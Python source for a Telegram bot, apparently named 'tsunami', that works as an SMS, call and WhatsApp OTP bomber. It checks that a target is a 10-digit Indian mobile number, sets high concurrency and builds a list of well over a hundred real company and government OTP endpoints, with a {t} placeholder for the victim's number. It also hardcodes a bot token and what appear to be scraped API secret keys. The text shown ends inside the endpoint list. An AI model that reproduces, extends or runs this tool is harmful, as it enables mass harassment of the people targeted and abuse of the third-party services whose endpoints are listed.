import os
import sys
import time
import asyncio
import logging
import random
import uuid
import hmac
import hashlib
import base64
from typing import Optional

import aiohttp
from telegram import Update, Bot, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, MessageHandler, CallbackQueryHandler, ContextTypes, filters,
)
import uvicorn

# ================== CONFIG ==================
BOT_TOKEN   = "9192223271:AAHI2vK-efdy83e-OWtO2P9hwMQLTZSE8sw"
WEBHOOK_URL = os.environ.get("RENDER_EXTERNAL_URL", "").rstrip("/")
PORT        = int(os.environ.get("PORT", 8000))

CHANNEL_ID   = int(os.environ.get("CHANNEL_ID", "-1004264694127"))
CHANNEL_LINK = os.environ.get("CHANNEL_LINK", "https://t.me/heisebburgscript")

CONCURRENCY     = 150
DELAY           = 0.1
REQUEST_TIMEOUT = 5
# ============================================

logging.basicConfig(format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO)
logger = logging.getLogger("tsunami")

user_sessions: dict = {}
_http_session: Optional[aiohttp.ClientSession] = None
telegram_app: Optional[Application] = None

def is_valid_target(num: str) -> bool:
    return num.isdigit() and len(num) == 10 and num[0] in "6789"

# =========================================================================
#  MEMBERSHIP CHECK
# =========================================================================
async def is_member(bot: Bot, user_id: int) -> bool:
    try:
        member = await bot.get_chat_member(chat_id=CHANNEL_ID, user_id=user_id)
        return member.status in ("member", "administrator", "creator")
    except Exception as e:
        logger.warning(f"membership check failed for {user_id}: {e}")
        return False

def force_join_keyboard():
    keyboard = [
        [InlineKeyboardButton("📢 Join Channel", url=CHANNEL_LINK)],
        [InlineKeyboardButton("✅ Verify Membership", callback_data="verify_join")],
    ]
    return InlineKeyboardMarkup(keyboard)

# =========================================================================
#  THE ULTIMATE API LIST (Merged: Bot + #Hotstar.txt + all unique)
# =========================================================================
def build_endpoints():
    UA_D = "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36"
    E = []

    # =====================================================================
    # SECTION 1 — FROM EXISTING BOT (voice/call APIs first)
    # =====================================================================
    E.append({"name":"Swiggy_Call","method":"POST","url":"https://profile.swiggy.com/api/v3/app/request_call_verification","headers":{"Content-Type":"application/json","User-Agent":UA_D,"Origin":"https://www.swiggy.com"},"data":'{"mobile":"{t}"}'})
    E.append({"name":"TataCapital_Voice","method":"POST","url":"https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}","isOtpViaCallAtLogin":"true"}'})
    E.append({"name":"1MG_Call","method":"POST","url":"https://www.1mg.com/auth_api/v6/create_token","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"number":"{t}","otp_on_call":true}'})
    E.append({"name":"MagicPin_Call","method":"POST","url":"https://webapi.magicpin.in/ultron-web/sentAuthOtp_v2/","headers":{"Content-Type":"application/json","auth-secret-key":"kQLMCQBrfevxhzuPpFWT","Origin":"https://magicpin.in","User-Agent":UA_D},"data":'{"phoneNumber":"91{t}","authMethod":"call","token":""}'})
    E.append({"name":"AjioLogin","method":"POST","url":"https://login.web.ajio.com/api/auth/generateLoginOTP","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"mobileNumber":"{t}"}'})
    E.append({"name":"AjioSignup","method":"POST","url":"https://login.web.ajio.com/api/auth/signupSendOTP","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"mobileNumber":"{t}","requestType":"SENDOTP","newDesign":false}'})
    E.append({"name":"BigBasketDaily","method":"POST","url":"https://bbdaily.bigbasket.com/bbd/ms/members/v2/sendotp","headers":{"Content-Type":"application/json","User-Agent":"BBD/Android/7.5.0/14"},"data":'{"identifier":"{t}","referrer":"unified_login"}'})
    E.append({"name":"Aakash","method":"POST","url":"https://antheapi.aakash.ac.in/api/generate-lead-otp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"mobile_psid":"{t}","mobile_number":"","activity_type":"aakash-myadmission-signup","webengageData":{"profile":"student","whatsapp_opt_in":false,"method":"mobile"}}'})
    E.append({"name":"ConfirmTkt","method":"GET","url":"https://securedapi.confirmtkt.com/api/platform/registerOutput?mobileNumber={t}&newOtp=true&retry=false&hashOtp=true&fireBaseSMSvendor=karix&locale=en&channel=Android&appVersion=463&session={uuid}","headers":{"User-Agent":"okhttp/5.0.0-alpha.3"},"data":None})
    E.append({"name":"Housing","method":"POST","url":"https://mightyzeus-mum.housing.com/api/gql?apiName=LOGIN_SEND_OTP_API&emittedFrom=client_buy_home","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"query":"mutation($phone: String) { sendOtp(phone: $phone) { success } }","variables":{"phone":"{t}"}}'})
    E.append({"name":"JarApp","method":"POST","url":"https://prod.myjar.app/v3/api/auth/requestOTP","headers":{"Content-Type":"application/json","User-Agent":UA_D,"app-signature":"28f0a03fa7c891e812954517ca3d242e5e352018a707a42a9f2d06a9e1e0e674"},"data":'{"hasExperianConsent":true,"phoneNumber":"{t}","countryCode":"91"}'})
    E.append({"name":"My11Circle_Old","method":"POST","url":"https://www.my11circle.com/api/fl/auth/v3/getOtp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"email":"","mobile":"{t}","whatsappAlerts":false}'})
    E.append({"name":"NykaaFashion","method":"POST","url":"https://www.nykaafashion.com/grahak-service/api/v1/auth/login/init?loginMethod=MOBILE_OTP","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"mobileOrEmail":"{t}"}'})
    E.append({"name":"TVSMotor","method":"POST","url":"https://tvsconnectapi.tvsmotor.com/api/v3/UserLogin/Loginv3","headers":{"Content-Type":"application/json","User-Agent":"okhttp/5.0.0-alpha.2"},"data":'{"IsSuppressOTP":false,"MobileNumber":"{t}","otpLength":6}'})
    E.append({"name":"ZeptoSignup","method":"POST","url":"https://api.zepto.co.in/api/v1/user/customer/signup/","headers":{"Content-Type":"application/json","User-Agent":"okhttp/4.12.0"},"data":'{"signupType":"otp_sms","data":{"mobile_number":"{t}"}}'})
    E.append({"name":"ZestMoney","method":"POST","url":"https://app.zestmoney.in/zestlife/v2/Customer/GenerateOtp","headers":{"Content-Type":"application/json","User-Agent":"okhttp/4.9.1"},"data":'{"email":"","mobileNumber":"91{t}"}'})
    E.append({"name":"CountryDelight_Old","method":"POST","url":"https://api.countrydelight.in/api/v1/customer/requestOtp","headers":{"Content-Type":"application/json","User-Agent":UA_D,"x-source":"Android"},"data":'{"mobile_number":"{t}","new_user":true,"device":"Android","mode":"SMS"}', "hmac": True})
    E.append({"name":"Ding","method":"POST","url":"https://www.ding.com/PhoneLogin/OwnedPhoneNumber","headers":{"Content-Type":"application/json; charset=UTF-8"},"data":'{"phoneNumber":"{t}","countryDial":92}'})
    E.append({"name":"GrocerApp","method":"POST","url":"https://endpoints.grocerapps.com/v1/otp/generate","headers":{"Content-Type":"application/json"},"data":'{"phone_number":"{t}","type":"sms"}'})
    E.append({"name":"Udhaar","method":"POST","url":"https://web.udhaar.pk/udhaar/dukaan/create/sendotp/","headers":{"Content-Type":"application/json"},"data":'{"phone_number":"0{t}","referer":null,"version":"multi-business"}'})
    E.append({"name":"KPN_WA","method":"POST","url":"https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=WEB","headers":{"Content-Type":"application/json"},"data":'{"phone_number":{"number":"{t}","country_code":"+91"}}'})
    E.append({"name":"MamaEarth_WA","method":"POST","url":"https://auth.mamaearth.in/v1/auth/initiate-signup","headers":{"Content-Type":"application/json"},"data":'{"mobile":"{t}"}'})
    E.append({"name":"HeroFinCorp_WA","method":"POST","url":"https://loans.apps.herofincorp.com/api/generateOtp","headers":{"Content-Type":"application/json"},"data":'{"phone":"{t}","terms":true,"whatsapp":true}'})
    E.append({"name":"Refyne_WA","method":"POST","url":"https://prod-api.refyne.co.in/auth/v3/send-otp","headers":{"Content-Type":"application/json"},"data":'{"channel":"WHATSAPP","recipient":"{t}"}'})
    E.append({"name":"VisitApp_WA","method":"POST","url":"https://api.getvisitapp.com/v3/new-auth/login-phone","headers":{"Content-Type":"application/json"},"data":'{"channel":"whatsapp","resend":true,"countryCode":91,"phone":"{t}","platform":"WEB"}'})
    E.append({"name":"Lenskart_Old","method":"POST","url":"https://api-gateway.juno.lenskart.com/v3/customers/sendOtp","headers":{"Content-Type":"application/json"},"data":'{"phoneCode":"+91","telephone":"{t}"}'})
    E.append({"name":"PharmEasy_Old","method":"POST","url":"https://pharmeasy.in/api/v2/auth/send-otp","headers":{"Content-Type":"application/json"},"data":'{"phone":"{t}"}'})
    E.append({"name":"Wakefit_Old","method":"POST","url":"https://api.wakefit.co/api/consumer-sms-otp/","headers":{"Content-Type":"application/json"},"data":'{"mobile":"{t}"}'})
    E.append({"name":"ShipRocket_Old","method":"POST","url":"https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send","headers":{"Content-Type":"application/json"},"data":'{"mobileNumber":"{t}"}'})
    E.append({"name":"Khatabook_Old","method":"POST","url":"https://api.khatabook.com/v1/auth/request-otp","headers":{"Content-Type":"application/json"},"data":'{"phone":"{t}","app_signature":"wk+avHrHZf2"}'})
    E.append({"name":"RummyCircle_Old","method":"POST","url":"https://www.rummycircle.com/api/fl/auth/v3/getOtp","headers":{"Content-Type":"application/json"},"data":'{"mobile":"{t}","isPlaycircle":false}'})
    E.append({"name":"Apna_Old","method":"POST","url":"https://production.apna.co/api/userprofile/v1/otp/","headers":{"Content-Type":"application/json"},"data":'{"hash_type":"original","phone_number":"91{t}","request_id":"{timestamp}","retries":0}'})
    E.append({"name":"BajajFinserv","method":"POST","url":"https://apigateway.bajajfinserv.in/apigateway/otp/sso","headers":{"Content-Type":"application/json"},"data":'{"mobileNumber":"{t}","source":"WEB"}'})
    E.append({"name":"Udaan","method":"POST","url":"https://auth.udaan.com/api/otp/send?client_id=udaan-v2&whatsappConsent=true","headers":{"Content-Type":"application/x-www-form-urlencoded"},"data":"mobile={t}"})
    E.append({"name":"OLX_Old","method":"POST","url":"https://www.olx.in/api/auth/authenticate?lang=en-IN","headers":{"Content-Type":"application/json"},"data":'{"method":"sms","phone":"{t}","language":"en-IN","grantType":"retry"}'})
    E.append({"name":"JioSaavn_Old","method":"POST","url":"https://api1.jiosaavn.com/jio/sendOtp?__call=jio%2FsendOtp&api_version=4&_format=json&_marker=0&ctx=wap6dot0","headers":{"Content-Type":"application/json"},"data":'{"phone_number":"+91{t}"}'})
    E.append({"name":"Licious_Old","method":"POST","url":"https://www.licious.com/auth/api/v1/sendOtp","headers":{"Content-Type":"application/json"},"data":'{"mobile":"{t}","countryCode":"+91"}'})
    E.append({"name":"Groww","method":"POST","url":"https://groww.in/api/v2/auth/otp/send","headers":{"Content-Type":"application/json"},"data":'{"phone":"{t}","platform":"WEB"}'})
    E.append({"name":"RedBus_Old","method":"POST","url":"https://www.redbus.in/api/v2/auth/otp/send","headers":{"Content-Type":"application/json"},"data":'{"mobile":"{t}","source":"web"}'})
    E.append({"name":"Dominos_Old","method":"POST","url":"https://pizzaonline.dominos.co.in/api/v2/customer/sendOtp","headers":{"Content-Type":"application/json"},"data":'{"mobile":"{t}"}'})
    E.append({"name":"McDelivery","method":"POST","url":"https://mcdelivery.mcdonaldsindia.com/api/customer/sendOTP","headers":{"Content-Type":"application/json"},"data":'{"phone":"{t}"}'})
    E.append({"name":"KFC_Old","method":"POST","url":"https://online.kfc.co.in/api/customer/otp/generate","headers":{"Content-Type":"application/json"},"data":'{"phone":"{t}"}'})
    E.append({"name":"BigBasket_Old","method":"POST","url":"https://www.bigbasket.com/bb-oauth/api/v2.0/otp/generate/","headers":{"Content-Type":"application/json"},"data":'{"mobile_number":"{t}"}'})
    E.append({"name":"Blinkit_Old","method":"POST","url":"https://api.grofers.com/v5/otp","headers":{"Content-Type":"application/json"},"data":'{"phone":"{t}"}'})
    E.append({"name":"Zepto_Old","method":"POST","url":"https://bff-gateway.zepto.com/api/v1/user/customer/send-otp-sms/","headers":{"Content-Type":"application/json"},"data":'{"mobileNumber":"{t}"}'})
    E.append({"name":"JioMart_Old","method":"POST","url":"https://www.jiomart.com/api/v1/user/send-otp","headers":{"Content-Type":"application/json"},"data":'{"mobile":"{t}"}'})
    E.append({"name":"Snapdeal_Old","method":"POST","url":"https://www.snapdeal.com/authenticate/otp/send","headers":{"Content-Type":"application/json"},"data":'{"mobile":"{t}"}'})
    E.append({"name":"Ajio_Old","method":"POST","url":"https://www.ajio.com/api/otp/generate","headers":{"Content-Type":"application/json"},"data":'{"mobile":"{t}"}'})
    E.append({"name":"Myntra_Old","method":"POST","url":"https://www.myntra.com/gw/mobile-auth/otp/generate","headers":{"Content-Type":"application/json"},"data":'{"mobile":"{t}"}'})
    E.append({"name":"Meesho_Old","method":"POST","url":"https://www.meesho.com/api/v1/otp/send","headers":{"Content-Type":"application/json"},"data":'{"phone":"{t}"}'})
    E.append({"name":"EaseMyTrip_Old","method":"POST","url":"https://www.easemytrip.com/api/otp/SendOtp","headers":{"Content-Type":"application/json"},"data":'{"Mobileno":"{t}","Type":"M"}'})
    E.append({"name":"KreditBee","method":"POST","url":"https://api.kreditbee.in/api/v2/auth/otp/send","headers":{"Content-Type":"application/json"},"data":'{"phone":"{t}"}'})
    E.append({"name":"Netmeds_Old","method":"POST","url":"https://www.netmeds.com/api/v2/auth/login/send-otp","headers":{"Content-Type":"application/json"},"data":'{"mobile":"{t}"}'})
    E.append({"name":"Unacademy_Old","method":"POST","url":"https://unacademy.com/api/v2/user/sendOtp","headers":{"Content-Type":"application/json"},"data":'{"phone":"{t}"}'})
    E.append({"name":"Purplle","method":"POST","url":"https://www.purplle.com/api/v2/auth/send-otp","headers":{"Content-Type":"application/json"},"data":'{"mobile":"{t}"}'})
    E.append({"name":"Cultfit_Old","method":"POST","url":"https://www.cult.fit/api/v2/sendOtp","headers":{"Content-Type":"application/json"},"data":'{"phone":"{t}"}'})
    E.append({"name":"Housing_SMS","method":"POST","url":"https://login.housing.com/api/v2/send-otp","headers":{"Content-Type":"application/json"},"data":'{"phone":"{t}","country_url_name":"in"}'})
    E.append({"name":"PropTiger","method":"POST","url":"https://www.proptiger.com/api/sendOtp","headers":{"Content-Type":"application/json"},"data":'{"phone":"{t}"}'})
    E.append({"name":"Practo","method":"POST","url":"https://www.practo.com/api/v2/auth/send-otp","headers":{"Content-Type":"application/json"},"data":'{"phone":"{t}"}'})
    E.append({"name":"HealthKart","method":"POST","url":"https://www.healthkart.com/api/customer/sendOtp","headers":{"Content-Type":"application/json"},"data":'{"mobile":"{t}"}'})
    E.append({"name":"Cars24","method":"POST","url":"https://www.cars24.com/api/v2/auth/sendOtp","headers":{"Content-Type":"application/json"},"data":'{"phone":"{t}"}'})
    E.append({"name":"CarDekho","method":"POST","url":"https://www.cardekho.com/api/v2/sendOtp","headers":{"Content-Type":"application/json"},"data":'{"phone":"{t}"}'})
    E.append({"name":"MagicBricks","method":"POST","url":"https://www.magicbricks.com/api/v2/sendOtp","headers":{"Content-Type":"application/json"},"data":'{"phone":"{t}"}'})
    E.append({"name":"99acres","method":"POST","url":"https://www.99acres.com/api/v2/sendOtp","headers":{"Content-Type":"application/json"},"data":'{"phone":"{t}"}'})
    E.append({"name":"NoBroker_Old","method":"POST","url":"https://www.nobroker.in/api/v4/account/otp/send","headers":{"Content-Type":"application/x-www-form-urlencoded"},"data":"phone={t}&countryCode=IN"})
    E.append({"name":"MamaEarth_SMS_Old","method":"POST","url":"https://auth.mamaearth.in/v1/auth/sms-otp","headers":{"Content-Type":"application/json"},"data":'{"mobile":"{t}"}'})
    E.append({"name":"PlumGoodness","method":"POST","url":"https://www.plumgoodness.com/api/sendOtp","headers":{"Content-Type":"application/json"},"data":'{"phone":"{t}"}'})
    E.append({"name":"Biotique","method":"POST","url":"https://www.biotique.com/api/sendOtp","headers":{"Content-Type":"application/json"},"data":'{"phone":"{t}"}'})
    E.append({"name":"HealthifyMe","method":"POST","url":"https://api.healthifyme.com/api/v2/sendOtp","headers":{"Content-Type":"application/json"},"data":'{"phone":"{t}"}'})
    E.append({"name":"UMANG","method":"POST","url":"https://web.umang.gov.in/api/v2/sendOtp","headers":{"Content-Type":"application/json"},"data":'{"mobile":"{t}"}'})
    E.append({"name":"Jio_Old","method":"POST","url":"https://www.jio.com/api/jio-login-service/login/sendOtp","headers":{"Content-Type":"application/json"},"data":'{"mobileNumber":"{t}","loginFlowType":"MOBILE","alternateNumber":""}'})
    E.append({"name":"Porter","method":"POST","url":"https://api.porter.in/api/v2/sendOtp","headers":{"Content-Type":"application/json"},"data":'{"phone":"{t}"}'})
    E.append({"name":"Delhivery","method":"POST","url":"https://www.delhivery.com/api/v2/sendOtp","headers":{"Content-Type":"application/json"},"data":'{"phone":"{t}"}'})
    E.append({"name":"BookMyShow_Old","method":"POST","url":"https://in.bookmyshow.com/auth/send/otp","headers":{"Content-Type":"application/json"},"data":'{"mobile":"{t}"}'})
    E.append({"name":"PVR","method":"POST","url":"https://www.pvrcinmovies.com/api/v2/sendOtp","headers":{"Content-Type":"application/json"},"data":'{"phone":"{t}"}'})
    E.append({"name":"Voot_CheckUser","method":"POST","url":"https://us-central1-vootdev.cloudfunctions.net/usersV3/v3/checkUser","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"type":"mobile","mobile":"{t}","countryCode":"+91"}'})
    E.append({"name":"MedPlus_Register","method":"POST","url":"https://mobile.medplusindia.com/mobilemvc/profile/register.mbl","headers":{"Content-Type":"application/x-www-form-urlencoded","User-Agent":UA_D},"data":"recieveUpdates=1&mobileNumber={t}"})
    E.append({"name":"Netmeds_Details","method":"GET","url":"https://m.netmeds.com/mst/rest/v1/id/details/{t}","headers":{"User-Agent":UA_D},"data":None})
    E.append({"name":"InstaCash_OTP","method":"POST","url":"https://getinstacash.in/sell/getData.php","headers":{"Content-Type":"application/x-www-form-urlencoded","User-Agent":UA_D},"data":"type=sendOTP&mobile={t}"})
    E.append({"name":"Snapdeal_Signup","method":"POST","url":"https://m.snapdeal.com/signupCompleteAjax","headers":{"Content-Type":"application/x-www-form-urlencoded","User-Agent":UA_D},"data":"j_mobilenumber={t}&agree=true&journey=mobile&swp=true"})
    E.append({"name":"Cuemath_Parent","method":"POST","url":"https://www.cuemath.com/api/v4/parents/","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}","email":"","full_name":"","place_id":""}'})
    E.append({"name":"Doubtnut_Login_Old","method":"POST","url":"https://doubtnut.com/api/v1/user/login","headers":{"Content-Type":"application/x-www-form-urlencoded","User-Agent":UA_D},"data":"phone={t}"})
    E.append({"name":"Vedantu_PreLogin_Old","method":"POST","url":"https://user.vedantu.com/user/preLoginVerification","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phoneCode":"+91","phoneNumber":"{t}","ver":"11.345"}'})
    E.append({"name":"Byjus_SendOtp_Old","method":"POST","url":"https://bcas-prod.byjusweb.com/api/send-otp","headers":{"Content-Type":"application/x-www-form-urlencoded","User-Agent":UA_D},"data":"phoneNumber={t}&page=free-trial-classes"})
    E.append({"name":"Redbus_GetOtp_Old","method":"GET","url":"https://m.redbus.in/api/getOtp?number={t}&cc=91&whatsAppOpted=undefined","headers":{"User-Agent":UA_D},"data":None})
    E.append({"name":"Coolwinks_Check_Old","method":"GET","url":"https://api.coolwinks.com/api/accounts/is_already_registered/?username={t}","headers":{"User-Agent":UA_D},"data":None})
    E.append({"name":"Cansell_Signup","method":"POST","url":"https://webapi.cansell.in/api/User/SignUp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"name":"","email":"","phone":"{t}","password":""}'})
    E.append({"name":"Flipkart_Login_Old","method":"POST","url":"https://1.rome.api.flipkart.com/1/action/view","headers":{"Content-Type":"application/json","x-user-agent":UA_D},"data":'{"actionRequestContext":{"type":"LOGIN_IDENTITY_VERIFY","loginId":"{t}"}}'})
    E.append({"name":"Ullu_SendOtp","method":"POST","url":"https://ullu.app/ulluCore/api/v1/otp/sendRegisterOTP?mobileNumber={t}","headers":{"User-Agent":"okhttp/4.9.0"},"data":None})
    E.append({"name":"Aakash_Digital","method":"POST","url":"https://digital.aakash.ac.in/signup-otp-verify","headers":{"Content-Type":"application/x-www-form-urlencoded","User-Agent":UA_D},"data":"mobileval={t}"})
    E.append({"name":"Cilory_Auth","method":"POST","url":"https://www.cilory.com/app/w/auth/soft","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"mobile":"{t}"}'})
    E.append({"name":"BookMyShow_PWA","method":"POST","url":"https://in.bookmyshow.com/pwa/api/uapi/otp/send","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"channel":"phone","subChannel":"sms","details":{"phone":"{t}"}}'})
    E.append({"name":"Flomattress_OTP","method":"POST","url":"https://cod.flomattress.com/api/otp","headers":{"Content-Type":"application/x-www-form-urlencoded","User-Agent":UA_D},"data":"number={t}&store=hushbedding.myshopify.com"})
    E.append({"name":"Lenskart_v2","method":"POST","url":"https://api.lenskart.com/v2/customers/sendOtp","headers":{"Content-Type":"application/json","User-Agent":UA_D,"x-api-client":"mobilesite"},"data":'{"telephone":"{t}"}'})
    E.append({"name":"EasyMyTrip_Register","method":"POST","url":"https://mybookings.easemytrip.com/MyBooking/RegisterNewUser/","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"emailph":"{t}"}'})
    E.append({"name":"PizzaHut_OTP","method":"POST","url":"https://api.pizzahut.io/v1/otp/generate","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"+91{t}"}'})
    E.append({"name":"Dineout_Signup","method":"POST","url":"https://www.dineout.co.in/xhrajaxrequest/user_signup","headers":{"Content-Type":"application/x-www-form-urlencoded","User-Agent":UA_D},"data":"name=&email=&phone={t}"})
    E.append({"name":"AngelBroking_Form","method":"POST","url":"https://www.angelbroking.com/form-gateways/oda-form.php","headers":{"Content-Type":"application/x-www-form-urlencoded","User-Agent":UA_D},"data":"name=&mobile={t}&city=pune"})
    E.append({"name":"Hungama_OTP_Old","method":"POST","url":"https://communication.api.hungama.com/v1/communication/otp","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"mobileNo":"{t}","countryCode":"+91","appCode":"un"}'})
    E.append({"name":"MeruCab_OTP_Old","method":"POST","url":"https://merucabapp.com/api/otp/generate","headers":{"Content-Type":"application/x-www-form-urlencoded","User-Agent":UA_D},"data":"mobile_number={t}"})
    E.append({"name":"Dayco_Ekyc_Old","method":"POST","url":"https://ekyc.daycoindia.com/api/nscript_functions.php","headers":{"Content-Type":"application/x-www-form-urlencoded","User-Agent":UA_D},"data":"api=send_otp&mob={t}"})
    E.append({"name":"NoBroker_v3_Old","method":"POST","url":"https://www.nobroker.in/api/v3/account/otp/send","headers":{"Content-Type":"application/x-www-form-urlencoded","User-Agent":UA_D},"data":"phone={t}&countryCode=IN"})
    E.append({"name":"ShipRocket_v1","method":"POST","url":"https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"mobileNumber":"{t}"}'})
    E.append({"name":"PenPencil_OTP_Old","method":"POST","url":"https://api.penpencil.co/v1/users/resend-otp?smsType=1","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"organizationId":"5eb393ee95fab7468a79d189","mobile":"{t}"}'})
    E.append({"name":"Servetel_OTP_Old","method":"POST","url":"https://api.servetel.in/v1/auth/otp","headers":{"Content-Type":"application/x-www-form-urlencoded","User-Agent":UA_D},"data":"mobile_number={t}"})
    E.append({"name":"Doubtnut_v4_Old","method":"POST","url":"https://api.doubtnut.com/v4/student/login","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone_number":"{t}","language":"en"}'})
    E.append({"name":"GoPinkCabs_Old","method":"POST","url":"https://www.gopinkcabs.com/app/cab/customer/login_admin_code.php","headers":{"Content-Type":"application/x-www-form-urlencoded","User-Agent":UA_D},"data":"check_mobile_number=1&contact={t}"})
    E.append({"name":"Flipkart_2Rome","method":"POST","url":"https://2.rome.api.flipkart.com/api/4/user/otp/generate","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"mobileNumber":"{t}"}'})

    # =====================================================================
    # SECTION 2 — NEW APIs FROM BOT
    # =====================================================================
    E.append({"name":"Lenskart_New","method":"POST","url":"https://api-gateway.juno.lenskart.com/v3/customers/sendOtp","headers":{"Content-Type":"application/json","X-API-Client":"mobilesite","X-Country-Code":"IN"},"data":'{"captcha":null,"phoneCode":"+91","telephone":"{t}"}'})
    E.append({"name":"NoBroker_New","method":"POST","url":"https://www.nobroker.in/api/v3/account/otp/send","headers":{"Content-Type":"application/x-www-form-urlencoded"},"data":"phone={t}&countryCode=IN"})
    E.append({"name":"GoKwik","method":"POST","url":"https://gkx.gokwik.co/v3/gkstrict/auth/otp/send","headers":{"Content-Type":"application/json","gk-merchant-id":"19g6jlc658iad"},"data":'{"phone":"{t}","country":"in"}'})
    E.append({"name":"Wakefit_New","method":"POST","url":"https://api.wakefit.co/api/consumer-sms-otp/","headers":{"Content-Type":"application/json","API-Secret-Key":"ycq55IbIjkLb"},"data":'{"mobile":"{t}","whatsapp_opt_in":1}'})
    E.append({"name":"Hungama_New","method":"POST","url":"https://communication.api.hungama.com/v1/communication/otp","headers":{"Content-Type":"application/json","identifier":"home"},"data":'{"mobileNo":"{t}","countryCode":"+91","appCode":"un","messageId":"1","device":"web"}'})
    E.append({"name":"Khatabook_New","method":"POST","url":"https://api.khatabook.com/v1/auth/request-otp","headers":{"Content-Type":"application/json"},"data":'{"phone":"{t}","app_signature":"wk+avHrHZf2"}'})
    E.append({"name":"Doubtnut_New","method":"POST","url":"https://api.doubtnut.com/v4/student/login","headers":{"Content-Type":"application/json"},"data":'{"phone_number":"{t}","language":"en"}'})
    E.append({"name":"BeepKart","method":"POST","url":"https://api.beepkart.com/buyer/api/v2/public/leads/buyer/otp","headers":{"Content-Type":"application/json"},"data":'{"phone":"{t}","city":362}'})
    E.append({"name":"Snitch","method":"POST","url":"https://mxemjhp3rt.ap-south-1.awsapprunner.com/auth/otps/v2","headers":{"Content-Type":"application/json","client-id":"snitch_secret"},"data":'{"mobile_number":"+91{t}"}'})
    E.append({"name":"RummyCircle_New","method":"POST","url":"https://www.rummycircle.com/api/fl/auth/v3/getOtp","headers":{"Content-Type":"application/json"},"data":'{"mobile":"{t}","isPlaycircle":false}'})
    E.append({"name":"PokerBaazi","method":"POST","url":"https://nxtgenapi.pokerbaazi.com/oauth/user/send-otp","headers":{"Content-Type":"application/json"},"data":'{"mobile":"{t}","mfa_channels":"phno"}'})
    E.append({"name":"My11Circle_New","method":"POST","url":"https://www.my11circle.com/api/fl/auth/v3/getOtp","headers":{"Content-Type":"application/json"},"data":'{"mobile":"{t}"}'})
    E.append({"name":"Cosmofeed","method":"POST","url":"https://prod.api.cosmofeed.com/api/user/authenticate","headers":{"Content-Type":"application/json"},"data":'{"phone":"{t}","version":"1.4.28"}'})
    E.append({"name":"Dream11","method":"POST","url":"https://www.dream11.com/auth/passwordless/init","headers":{"Content-Type":"application/json"},"data":'{"channel":"sms","flow":"SIGNUP","phoneNumber":"{t}","templateName":"default"}'})
    E.append({"name":"Unacademy_New","method":"POST","url":"https://unacademy.com/api/v3/user/user_check/","headers":{"Content-Type":"application/json"},"data":'{"phone":"{t}","send_otp":true}'})
    E.append({"name":"Vedantu_New","method":"POST","url":"https://user.vedantu.com/user/preLoginVerification","headers":{"Content-Type":"application/json"},"data":'{"phoneNumber":"{t}","phoneCode":"+91"}'})
    E.append({"name":"Byjus_New","method":"POST","url":"https://bcas-prod.byjusweb.com/api/send-otp","headers":{"Content-Type":"application/x-www-form-urlencoded"},"data":"phoneNumber={t}"})
    E.append({"name":"Spinny","method":"POST","url":"https://api.spinny.com/api/c/user/otp-request/v3/","headers":{"Content-Type":"application/json"},"data":'{"contact_number":"{t}","whatsapp":false,"code_len":4,"expected_action":"login"}'})
    E.append({"name":"Citymall","method":"POST","url":"https://citymall.live/api/cl-user/auth/get-otp","headers":{"Content-Type":"application/json"},"data":'{"phone_number":"{t}"}'})
    E.append({"name":"Jobhai","method":"POST","url":"https://api.jobhai.com/auth/jobseeker/v3/send_otp","headers":{"Content-Type":"application/json"},"data":'{"phone":"{t}"}'})
    E.append({"name":"Kwikfix","method":"POST","url":"https://admin.kwikfixauto.in/api/auth/signupotp/","headers":{"Content-Type":"application/json"},"data":'{"phone":"{t}"}'})
    E.append({"name":"Brevistay","method":"POST","url":"https://www.brevistay.com/cst/app-api/login","headers":{"Content-Type":"application/json"},"data":'{"mobile":"{t}"}'})
    E.append({"name":"Hourlyrooms","method":"POST","url":"https://web-api.hourlyrooms.co.in/api/signup/sendphoneotp","headers":{"Content-Type":"application/json"},"data":'{"phone":"{t}"}'})
    E.append({"name":"BharatLoan","method":"POST","url":"https://www.bharatloan.com/login-sbm","headers":{"Content-Type":"application/x-www-form-urlencoded"},"data":"mobile={t}"})
    E.append({"name":"Pagarbook","method":"POST","url":"https://api.pagarbook.com/api/v5/auth/otp/request","headers":{"Content-Type":"application/json"},"data":'{"phone":"{t}","language":1}'})
    E.append({"name":"Redcliffe","method":"POST","url":"https://api.redcliffelabs.com/api/v1/notification/send_otp/","headers":{"Content-Type":"application/json"},"data":'{"phone_number":"{t}"}'})
    E.append({"name":"55Club","method":"POST","url":"https://api.55clubapi.com/api/webapi/SmsVerifyCode","headers":{"Content-Type":"application/json"},"data":'{"phone":"91{t}","codeType":1}'})
    E.append({"name":"Woodenstreet","method":"POST","url":"https://api.woodenstreet.com/api/v1/register","headers":{"Content-Type":"application/json"},"data":'{"telephone":"{t}"}'})
